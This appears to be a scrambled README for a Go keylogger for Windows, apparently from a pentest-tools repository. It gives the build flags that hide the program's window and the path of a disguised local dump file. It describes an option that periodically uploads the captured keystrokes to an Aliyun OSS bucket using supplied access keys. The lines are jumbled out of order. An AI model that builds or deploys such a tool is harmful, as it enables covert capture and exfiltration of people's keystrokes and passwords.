
        Upload interval,default: 60min (default 60)
        format: bucketName:accessKeyId:accessKeySecret:endpoint
  -o string
  -t int
# keylogger
## Compile
## Data
## Download Dependencies
### References
### Usage
> keylogger.exe -h
C:\Users\<USERNAME>\AppData\Local\Packages\Microsoft.Messaging\360se_dump.tmp
If you are in China Mainland, please check: https://goproxy.cn/ for golang dependency download proxy setting guide.
Tested only on Windows.
To prevent Aliyun OSS Access Key from leakage, please use with caution.
Usage of keylogger.exe:
Without any runtime params, it will never upload any recorded data.
```
go build -trimpath -ldflags "-s -w -H=windowsgui" key.go
go mod download # Use Proxy If you are in China!
https://github.com/mabangde/pentesttools/blob/master/golang/keylogger.go
